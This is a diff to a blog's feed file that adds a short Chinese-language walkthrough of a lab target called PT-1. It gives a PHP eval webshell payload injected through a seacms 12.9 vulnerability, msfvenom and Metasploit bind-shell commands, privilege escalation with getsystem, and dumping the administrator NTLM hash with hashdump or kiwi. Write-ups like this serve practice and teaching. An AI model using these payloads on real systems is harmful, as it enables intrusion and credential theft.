@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>PT-1</title>
+      <link href="/2025/06/04/PT-1/"/>
+      <url>/2025/06/04/PT-1/</url>
+      
+        <content type="html"><![CDATA[<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>打开靶机是一个电影网站，查到该网站的CMS是seacms版本12.9 存在漏洞，可以写入木马</p><p><code>1&quot;;@eval($_POST[cmd]);;//</code></p><p>使用蚁剑连接就行了，然后文件管理找flag01</p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>flag02的要求是提交amdinistrator的ntlmhash</p><p>靶机不能出网，所以利用msf生成木马，然后正向连接</p><p><code>msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=4444 -f exe &gt; shell.exe </code>生成木马文件</p><p>然后再开启正向连接</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">68</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>然后提权使用<code>getsystem</code></p><p>然后使用<code>hashdump</code>或者使用<code>load kiwi</code>就可以拿到hash了</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> PT-1靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>RCE</title>
       <link href="/2025/05/26/RCE/"/>
       <url>/2025/05/26/RCE/</url>
